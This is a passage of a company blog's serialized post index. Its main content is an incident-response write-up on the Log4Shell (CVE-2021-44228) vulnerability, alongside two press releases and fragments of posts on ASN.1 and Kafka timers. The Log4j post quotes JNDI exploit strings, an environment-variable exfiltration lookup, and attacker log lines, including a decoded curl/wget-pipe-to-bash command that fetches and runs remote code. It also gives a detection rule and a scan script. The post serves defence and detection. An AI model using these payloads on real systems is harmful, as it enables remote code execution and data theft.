format\\nspecified in\\n[ECMA-404](https://www.ecma-international.org/publications-and-standards/standards/ecma-404/).\\n\\nThere are probably a bunch of others as well, but these are the ones\\nthat have a specification.\\n\\n| ITU-T number                                                                           | Name                                                                                                                                     |\\n| -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |\\n| [X.690](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.690) | ASN.1 encoding rules: Specification of Basic Encoding Rules (BER), Canonical Encoding Rules (CER) and Distinguished Encoding Rules (DER) |\\n| [X.691](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.691) | ASN.1 encoding rules: Specification of Packed Encoding Rules (PER)                                                                       |\\n| [X.692](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.692) | ASN.1 encoding rules: Specification of Encoding Control Notation (ECN)                                                                   |\\n| [X.693](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.693) | ASN.1 encoding rules: XML Encoding Rules (XER)                                                                                           |\\n| [X.694](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.694) | ASN.1 encoding rules: Mapping W3C XML schema definitions into ASN.1                                                                      |\\n| [X.695](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.695) | ASN.1 encoding rules: Registration and application of PER encoding instructions                                                          |\\n| [X.696](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.696) | ASN.1 encoding rules: Specification of Octet Encoding Rules (OER)                                                                        |\\n| [X.697](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.697) | ASN.1 encoding rules: Specification of JavaScript Object Notation Encoding Rules (JER)                                                   |\\n\\n# Final words\\n\\nCongratulations for making through this blog post. You deserve a\\nmedal, and I hope this can help you understand the complexity and\\ngreatness of ASN.1.\\n\\nWe have gone through the **basics** of ASN.1, there are still a lot of\\nthings to be uncovered. You now understand the most common basic and\\nstructured types, as well as the main differences between the\\ndifferent encodings.\\n\\nIf I write a part 2 I will take you through the Diameter specs\\ninstead, which are much more straighforward.\\n\\nImage from [xkcd](https://xkcd.com) describing how I feel with ASN.1:\\n<a class=\\"image\\" href=\\"https://xkcd.com/208/\\"><img src=\\"https://imgs.xkcd.com/comics/regular_expressions.png\\" /></a>"},{"id":"log4j-security-vulnerability","metadata":{"permalink":"/blog/log4j-security-vulnerability","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-12-17-log4j-security-vulnerability.md","source":"@site/../blog/2021-12-17-log4j-security-vulnerability.md","title":"Zero-day vulnerabilities - Log4j","description":"On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as \u201cLog4Shell\u201d in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.","date":"2021-12-17T00:00:00.000Z","formattedDate":"December 17, 2021","tags":[{"label":"security","permalink":"/blog/tags/security"},{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"vulnerability","permalink":"/blog/tags/vulnerability"}],"readingTime":10.16,"truncated":true,"authors":[{"name":"Jonnathan Griffin","title":"Security Tech Lead","url":"https://www.linkedin.com/in/jonnathangriffin/","imageURL":"https://media-exp1.licdn.com/dms/image/C4E03AQEjrF7PC8veoQ/profile-displayphoto-shrink_400_400/0/1624522450808?e=1648684800&v=beta&t=LZVAsE5hVp3T50zGPk0qkf8qPJCnsXBlBXfCosrTH5o","key":"jonny-griffin"},{"name":"Yan Grunenberger","title":"Software Engineer","url":"https://www.linkedin.com/in/yangrunenberger/","imageURL":"https://media-exp1.licdn.com/dms/image/C5103AQGoJqu0xm9NQA/profile-displayphoto-shrink_200_200/0/1516341401517?e=1649894400&v=beta&t=hQWH1btszoHHB0CfWVgWn3G-q4ASOEEbvGrOz9oQG7M","key":"yan"}],"frontMatter":{"slug":"log4j-security-vulnerability","title":"Zero-day vulnerabilities - Log4j","date":"2021-12-17T00:00:00.000Z","tags":["security","infrastructure","vulnerability"],"authors":["jonny-griffin","yan"]},"prevItem":{"title":"The specs behind the specs part 1","permalink":"/blog/the-specs-behind-the-specs-part-1"},"nextItem":{"title":"CKH IOD selects Working Group Two for public cloud core network","permalink":"/blog/ckh-iod-wg2-public-cloud"}},"content":"On Friday, December 10th, **wgtwo** and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as \u201cLog4Shell\u201d in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.\\n\\n\x3c!--truncate--\x3e\\n\\n# Table of Contents\\n[Friday](#friday)\\n- [Code](#code)\\n- [Docker Vulnerability Scan Day 1](#docker-vulnerability-scan-day-1)\\n\\n[Saturday](#saturday)\\n- [Checking our infrastructure ourselves with DNS requests](#checking-our-infrastructure-ourselves-with-DNS-requests)\\n- [Log Analysis and Alerting](#log-analysis-and-alerting)\\n\\n[Monday](#monday)\\n- [Docker Vulnerability Scans](#docker-vulnerability-scans)\\n- [Monitoring vendors](#monitoring-vendors)\\n\\n[What worked well and could be improved](#what-worked-well-and-could-be-improved)\\n[Staying secure](#staying-secure)\\n[We are hiring](#we-are-hiring)\\n\\n# Friday\\n\\nMitigating 3rd party vulnerabilities is an ability that **wgtwo** has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture.\\n\\nWe knew that all versions of Log4j `2.0-beta9 <= Apache log4j <= 2.14.1` were affected.\\n\\n## Code\\n\\nNaturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely.\\n\\n## Docker Vulnerability Scan Day 1\\n\\nWe use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry.\\n\\nAt a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy\u2019s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified.\\n\\n# Saturday\\n\\n## Checking our infrastructure ourselves with DNS requests\\n\\nAt that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j.\\n\\nOne harmless way to detect vulnerability is to exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:\\n\\n![](/img/blog/log4j/01-canary-tokens.png)\\n\\nIf a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:\\n\\n```\\ncurl https://docs.wgtwo.com  -A \\"\\\\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}\\"\\n```\\n\\nAfter executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature.\\n\\nJNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world.\\n\\nGoing back to our problem, we quickly found this [Rogue JNDI](https://github.com/veracode-research/rogue-jndi). This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:\\n\\n![](/img/blog/log4j/02-supported-payloads.png)\\n\\nIn particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as:\\n\\n```\\n${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}\\n```\\n\\nThen, we should proceed to:\\n1) Identify if the affected components are in our stack or in the cloud provider\\n2) Apply mitigation\\n- Either via WAF - firewall rules on traffic.\\n- Either via known mitigation on the log4g components\\n  - Environment variable / JVM options\\n  - Java class removal\\n  - Full component upgrade\\n\\nFor (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j.\\n\\nAssuming this was the only element, we proceed to apply mitigation:\\nWe discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the `jndi:ldap` string used to trigger the vulnerability.\\nThe environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.\\nJava class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component.\\n\\n## Log Analysis and Alerting\\n\\nJust after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. `${jndi`\\n\\nCloudflare wrote a great [blog post](https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/) about the traffic they have seen when updating their firewall rules for preventing Log4j exploits.\\n\\nFor us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by [AWS Security Bulletin](https://aws.amazon.com/security/security-bulletins/AWS-2021-006/).\\n\\nTo get some ChatOps alerts in slack we use an open-source tool called [Elstalert](https://github.com/Yelp/elastalert). This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure.\\n\\nTo get started, we built the following Elastalert rule:\\n```yaml\\nlog4j.yaml: |-\\n  ---\\n  name: \\"log4j cve\\"\\n  index: logstash-*\\n  type: any\\n  realert:\\n    minutes: 15\\n  filter:\\n  - query:\\n    - query_string:\\n        query: \\"\\\\\\"jndi:ldap\\\\\\"\\"\\n  query_delay:\\n    minutes: 5\\n  query_key: \\"message\\"\\n  alert_text_type: alert_text_only\\n  include : [\\"kubernetes.container.name\\",\\"message\\"]\\n  alert:\\n  - \\"slack\\"\\n  alert_text: \\"\\n  *Container* : {0}\\\\n\\n  *Message* : {1}\\"\\n  alert_text_args: [\\"kubernetes.container.name\\",\\"message\\"]\\n  slack_channel_override: \\"#cve-2021-44228\\"\\n  slack_emoji_override: \\":unlock:\\"\\n  slack_msg_color: warning\\n  slack_title: Security RCE attempt for CVE-2021-44228\\n```\\nWe quickly then began to receive alerts of probing attempts across our environments.\\n\\n\\n![](/img/blog/log4j/03-elastalert.png)\\n\\nThe following alerts are **unsuccessful** exploit attempts our infrastructure.\\n\\nLet\u2019s take a closer look at some of these exploit attempts to see if we can learn anything..\\n\\n```bash\\n[2021-12-10T14:05:52.612 Z] \\"GET / HTTP/1.1\\" 307 - 0 0 0 - \\"45.155.205.233\\" \\"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}\\" \\"34b61b2d-28f6-4e89-9baf-7cd3b4e71698\\" \\"54.217.173.83:443\\" \\"-\\"\\n```\\nThis request was hitting our public API gateway with a base64 encoded payload. Decoding this payload we can see what the actor was trying to accomplish:\\n\\nbase64\\n```\\nKGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==\\n```\\n\\nbase64 decoded\\n```\\n(curl -s 45.155.205.233:5874/54.217.173.83:443||wget -q -O- 45.155.205.233:5874/54.217.173.83:443)|bash\\n```\\n\\nIf this attack was successful, we can see that the actor is attempting to download a malicious exploit first with `curl`, then attempt with `wget` and then execute with the downloaded payload with bash. If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from [Falco](https://github.com/falcosecurity/falco). In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack.\\n\\nLooking at more attempts, we started to see probing attempts using a 3rd party service using [Interactsh](https://github.com/projectdiscovery/interactsh).\\n\\n```bash\\n16/Dec/2021:06:11:07 +0000] \\"GET /?x=${jndi:ldap://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1\\" 302 0 \\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}\\" \\"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}\\" 685 0.015 [products-developer-portal-8080] 100.98.133.224:8080 0 0.014 302 548d1132926fa0bc9904e12523d2f250 [${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}, 173.249.19.100]\\n```\\n\\nWe see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable.\\n\\n```bash\\n[2021-12-14T22:57:36.722Z] \\"GET / HTTP/1.1\\" 307 - 0 0 0 - \\"51.105.55.17\\" \\"/${jndi:ldap://45.83.193.150:1389/Exploit}\\" \\"7c9223d6-2c81-491d-8564-10742cc90a9c\\" \\"54.75.196.220\\" \\"-\\"\\n```\\n\\nIn our Tokyo region, we started to see a lot of requests from `x00.it` domain.\\n\\n```bash\\n[14/Dec/2021:17:37:59 +0000] \\"GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1\\" 401 39 \\"${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_Referer.log4jdns.x00.it/}\\" \\"${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}\\" 4496 0.255 [monitoring-mki-lab-grafana-80] 100.115.164.63:3000 39 0.001 401 d7fa702ee8cc73793707ca6720c57639 [194.5.73.6]\\n```\\n\\nIn the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve.\\n\\n# Monday\\n\\n## Docker Vulnerability Scans\\n\\nNext, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from [this resource](https://github.com/cisagov/log4j-affected-db) that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with [kubectl](https://github.com/kubernetes/kubectl) and [Trivy](https://github.com/aquasecurity/trivy), a scanner for vulnerabilities in container images.\\n\\nFirst, we built a small POC to ensure that Trivy can identify the CVE-2021-44228.\\n\\n```bash\\n\u276f\u276f\u276f brew install aquasecurity/trivy/trivy\\n\u276f\u276f\u276f trivy image birdyman/log4j2-demo:1.0.0-12 | grep CVE-2021-44228\\n| org.apache.logging.log4j:log4j-api                     | CVE-2021-44228   | CRITICAL | 2.10.0            | 2.15.0                         | Remote code injection in Log4j                                                  |\\n```\\n\\nNow that we know Trivy works, let\u2019s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE.\\n\\n`trivy-scan-cve.sh CVE-2021-44228`\\n```bash\\n#!/usr/bin/env bash\\n\\nVULN=$1\\n\\necho \\"Scanning $1...\\"\\n\\nimgs=`kubectl get pods -A -o jsonpath=\'{range .items[*]}{.spec.containers[*].image}{\\" \\"}\' | tr \\" \\" \\"\\\\n\\" | sort -u`\\nfor img in ${imgs}; do\\n  echo \\"scanning ${img}\\"\\n  result=`trivy image --severity CRITICAL ${img}`\\n  if echo ${result} | grep -q \\"$1\\" ; then\\n    echo -e \\"${img} is vulnerable, please patch!\\"\\n  fi\\ndone\\n```\\n\\nWe ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods.\\n\\n## Monitoring Vendors\\n\\nIt is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required.\\n\\n# What worked well and could be improved\\n\\nDuring this incident management we have gathered great learnings in the way.\\n\\nFirst of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process.\\n\\nSecond, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry.\\n\\n# Staying secure\\n\\nAll in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment.\\n\\n# We are hiring\\n\\nIf you are a Security Engineer looking for a new challenge to make a secure mobile core platform, come and say hi. [https://wgtwo.jobs.personio.de/job/423396?display=en](https://wgtwo.jobs.personio.de/job/423396?display=en)"},{"id":"ckh-iod-wg2-public-cloud","metadata":{"permalink":"/blog/ckh-iod-wg2-public-cloud","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-12-01-ckh-iod-wg2-public-cloud.md","source":"@site/../blog/2021-12-01-ckh-iod-wg2-public-cloud.md","title":"CKH IOD selects Working Group Two for public cloud core network","description":"CKH IOD migrates its core network to the cloud \u2013 delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS","date":"2021-12-01T12:00:00.000Z","formattedDate":"December 1, 2021","tags":[{"label":"press release","permalink":"/blog/tags/press-release"},{"label":"telco","permalink":"/blog/tags/telco"}],"readingTime":3.725,"truncated":true,"authors":[{"name":"Erlend Prestgard","title":"CEO @ wgtwo","url":"https://www.linkedin.com/in/erlend-prestgard-ab47101/","imageURL":"https://media-exp1.licdn.com/dms/image/C5103AQH9UuKEbOXHNg/profile-displayphoto-shrink_400_400/0/1516307873887?e=1648684800&v=beta&t=a5hv6dDBFaF10p3Bk07W09IQjmXR1BWfTvhzED_tVXE","key":"erlend-prestgard"}],"frontMatter":{"slug":"ckh-iod-wg2-public-cloud","title":"CKH IOD selects Working Group Two for public cloud core network","description":"CKH IOD migrates its core network to the cloud \u2013 delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS","date":"2021-12-01:12:00:00","tags":["press release","telco"],"authors":"erlend-prestgard"},"prevItem":{"title":"Zero-day vulnerabilities - Log4j","permalink":"/blog/log4j-security-vulnerability"},"nextItem":{"title":"Mitsui Knowledge Industry (MKI) to develop private networks business","permalink":"/blog/mitsui-knowledge-industry-mki-private-networks-business"}},"content":"<img src=\\"/img/ckh.png\\" alt=\\"ckh\\" width=\\"300\\"/>\\n\\n- As an industry-first, CKH IOD migrates its core network to the cloud \u2013 delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS\\n- A cloud-based core network brings radical simplification, cost efficiency and a platform to leverage a developer community \u2013 to drive innovation and capitalize on disruptive technologies\\n\\n\x3c!--truncate--\x3e\\n\\n**Oslo/London, 1 December, 2021** \u2013 CKH Innovations Opportunities Development (CKH IOD) has entered into a contract with Working Group Two to move its core network to the public cloud. CKH IOD, a telecoms unit and international development hub of CK Hutchison, via a fully managed SaaS by Working Group Two, will deploy its mobile core network on Amazon Web Services (AWS). The agreement means that CKH IOD, and its MVNO, IoT and Private Network customers, can achieve radical simplification, speed up innovation, explore new revenue streams and get to market faster.\\n\\nCKH IOD will leverage Working Group Two\u2019s platform to deliver services across the CK Hutchison telecoms footprint in Europe, Asia and its wider international partners.\\n\\nBy evolving to a software-defined network, CKH IOD radically consolidates its vendor relationships and associated complexities. Working Group Two\u2019s fully managed mobile core network also automates operations and maintenance to deliver a more cost-efficient service.\\n\\n\u201cOur collaboration with Working Group Two to deploy our core network on the public cloud delivers simplicity, improved operational efficiency and the ability to quickly develop new initiatives to meet market needs, with particular focus on the MVNO, IoT and Private Network space. It\u2019s about achieving scale and the highest levels of security while reducing complexity \u2013 to the benefit of our customers and ultimately, end-users in our markets,\u201d says Joe Parker, CEO of CKH IOD.\\n\\n\u201cCKH IOD earns a first-mover advantage by deploying a core built leveraging the webscale playbook. Being built on the cloud and delivered as-a-service, this core enables simplicity, cost efficiency and a continuous evolution of capabilities and features \u2013 with no end-of-life. In addition, they get access to a community of partners that build and integrate into the cloud core, giving a vastly enhanced pace of innovation. Under the umbrella of \u201ceverything as-a-service\u201d the time has come to include the core network. We are incredibly excited to announce this landmark agreement,\u201d says Erlend Prestgard, CEO of Working Group Two.\\n\\nWorking Group Two leverages the proven infrastructure and breadth of services from AWS to deploy a cloud-native core network.\\n\\n\u201cWorking Group Two is a pioneer in building mobile core networks with much of the same philosophy that AWS builds infrastructure. Scalable, secure, consistent and API-driven, delivering the promise of efficiency and rapid innovation at scale,\u201d says David Brown, VP and GM of Amazon EC2.\\n\\n\u201cWith CKH IOD deciding to host its core network on the public cloud and have it fully managed by a third party under a managed SaaS model, we are witnessing a significant technology shift. By opting for a full set of capabilities from AWS, CKH IOD and Working Group Two can leverage the full benefits of the public cloud, including opening up for new business models. This will allow CKH IOD to scale their services and offerings with superior visibility and control. They will be stimulating a rapid pace of innovation with the highest levels of security and performance,\u201d says Fabio Cerone, Managing Director EMEA, Telco Business Unit at AWS.\\n\\n### About CKH Innovations Opportunities Development\\nCKH Innovations Opportunities Development is a telecom unit and international development hub of CK Hutchison, creating international and global technological innovations that are built on one of CK Hutchison\u2019s strongest assets, our mobile networks. We offer customised global mobile communications and data solutions that create new digital value and unprecedented opportunities for business. Our collaborative approach combined with our world-class network and experience means we are best placed to help our customers design, adapt, develop and scale solutions faster. Read more at https://www.ckhiod.com\\n\\n### About Working Group Two\\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at https://wgtwo.com\\n\\n### For more information\\nErlend Prestgard, CEO, Working Group Two, +47 4542 9555, erlend@wgtwo.com"},{"id":"mitsui-knowledge-industry-mki-private-networks-business","metadata":{"permalink":"/blog/mitsui-knowledge-industry-mki-private-networks-business","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-06-01-mitsui-knowledge-industry-mki-private-networks-business.md","source":"@site/../blog/2021-06-01-mitsui-knowledge-industry-mki-private-networks-business.md","title":"Mitsui Knowledge Industry (MKI) to develop private networks business","description":"Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS","date":"2021-06-01T12:00:00.000Z","formattedDate":"June 1, 2021","tags":[{"label":"press release","permalink":"/blog/tags/press-release"},{"label":"mki","permalink":"/blog/tags/mki"},{"label":"private networks","permalink":"/blog/tags/private-networks"}],"readingTime":2.395,"truncated":true,"authors":[{"name":"Naoya Ori","title":"APAC Sales & Japan Country Manager at wgtwo","url":"https://www.linkedin.com/in/naoya-ori-093482/","imageURL":"https://media-exp1.licdn.com/dms/image/C5603AQG-rqDygV8N5g/profile-displayphoto-shrink_400_400/0/1622885908562?e=1648684800&v=beta&t=TyC2BGDZddTK_MnLHIKnnwpH0LMrO_z71HcsEvPwVqU","key":"naoya-ori"}],"frontMatter":{"slug":"mitsui-knowledge-industry-mki-private-networks-business","title":"Mitsui Knowledge Industry (MKI) to develop private networks business","description":"Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS","date":"2021-06-01:12:00:00","tags":["press release","mki","private networks"],"authors":"naoya-ori"},"prevItem":{"title":"CKH IOD selects Working Group Two for public cloud core network","permalink":"/blog/ckh-iod-wg2-public-cloud"},"nextItem":{"title":"Kafka timers","permalink":"/blog/kafka-timers"}},"content":"<img src=\\"/img/mki.png\\" alt=\\"mki\\" width=\\"300\\"/>\\n\\n\u2014 Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS \u2014\\n\\nCEO Erlend Prestgard of Working Group Two As, Oslo, Norway and President Kengo Asano of Mitsui Knowledge Industry Co., Ltd. Minato-ku, Japan, agreed on an MoU on providing WG2\u2019s fully-managed Mobile Core NW SaaS product to accelerate the Private Networks business in the Japanese market.\\n\\n\x3c!--truncate--\x3e\\n\\nIn the Japanese market, there is a clear interest in Private NWs due to the regulatory setup of Private LTE and Local 5G. However, there are complex issues to overcome and Private NWs require professional knowledge to acquire a radio license, to design and operate the Core Network, and to optimize the Radio Network, all with reasonable cost. The MKI-WG2 agreement solves these problems:\\n\\n- One-stop solution from client\u2019s radio license acquisition to operational support\\n- WG2\u2019s Mobile Core NW built with a web-scale IT approach to simplify financial and operational aspects of the mobile system\\n- Parties will encourage and enable the Private NW operators to create new business\\n- MKI will provide WG2\u2019s Mobile Core SaaS as part of its offering as well as reselling it to other integrators to create a larger ecosystem\\n- MKI has radio network knowledge, and WG2 provides Mobile Core as a service (SaaS) that radically improves the cost model. With this partnership, both parties will combine those strengths and lift the Private NWs business to the next level.\\n\\n> \u201cTogether with MKI, we make the journey of launching feature-rich private networks simple and affordable. MKI\u2019s strong local presence and Working Group Two\u2019s ability to distill complex core networks into simple-to-use APIs allow customers to launch full-service mobile networks at a small scale \u2013 with market-leading affordability,\u201d said Erlend Prestgard, CEO and Co-Founder of Working Group Two.\\n\\n## About Working Group Two (wgtwo)\\nWG2 has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, WG2\u2019s innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all G\u2019s.\\n\\nOur mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services.\\n\\nWG2 is an Advanced Technology Partner of AWS: https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As\\n\\nWG2 Website: https://wgtwo.com\\n\\n### About Mitsui Knowledge Industry (MKI)\\n\\nUnder the slogan \u201cUnite Knowledge, Ignite the Future\u201d, Mitsui Knowledge Industry Co., Ltd. (MKI)  has been creating IT strategies and supporting the digital transformation of its clients as their strategic business partner specializing mainly in information and communication technology. By utilizing its wealth of \u201cKNOWLEDGE\u201d accumulated through its long experience in technological development and innovation continuing for over half a century, MKI remains consistent in its pursuit to live up to the high expectations of its customers as their most reliable \u201cvalue creator\u201d.\\n\\nMKI Website: https://www.mki.co.jp/english/about/\\n\\nPublished: June 1, 2021"},{"id":"kafka-timers","metadata":{"permalink":"/blog/kafka-timers","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-02-28-kafka-timers.md","source":"@site/../blog/2021-02-28-kafka-timers.md","title":"Kafka timers","description":"A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations","date":"2021-02-28T00:00:00.000Z","formattedDate":"February 28, 2021","tags":[{"label":"kafka","permalink":"/blog/tags/kafka"},{"label":"timer","permalink":"/blog/tags/timer"},{"label":"stateless","permalink":"/blog/tags/stateless"}],"readingTime":4.69,"truncated":true,"authors":[{"name":"Sergey Zyrianov","title":"Tech Lead @ wgtwo","url":"https://www.linkedin.com/in/sergey-zyrianov-8a7ab34/","imageURL":"https://media-exp1.licdn.com/dms/image/C4E03AQGorLVCY4wycA/profile-displayphoto-shrink_400_400/0/1517717861631?e=1648684800&v=beta&t=AlFhQGwrDEEj2XpvCyK5RzuwGE8Fw1TkPCT66GOAIAI","key":"sergey-zyrianov"}],"frontMatter":{"slug":"kafka-timers","title":"Kafka timers","date":"2021-02-28T00:00:00.000Z","tags":["kafka","timer","stateless"],"authors":"sergey-zyrianov"},"prevItem":{"title":"Mitsui Knowledge Industry (MKI) to develop private networks business","permalink":"/blog/mitsui-knowledge-industry-mki-private-networks-business"},"nextItem":{"title":"Changing the color of your bulbs: The fancy way","permalink":"/blog/mqtt-event-bridge"}},"content":"A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations\\nthat provide a timer facility. Most of them are in memory and will lose scheduled timers should the application crash.\\nIn this blog we discuss durable Kafka timers that do not depend on in memory state. By design\\nwe shall assume 1 second resolution of these timers.\\n\\n\x3c!--truncate--\x3e\\n\\nBefore taking on timers let\'s cover some Kafka basics.\\n\\n## Kafka concepts\\nThere are a few Kafka concepts in play to simulate timers - Kafka topic, Kafka stream, Kafka streams library.\\nWhere *topic* is append only log of events, *stream* is a cache of N most 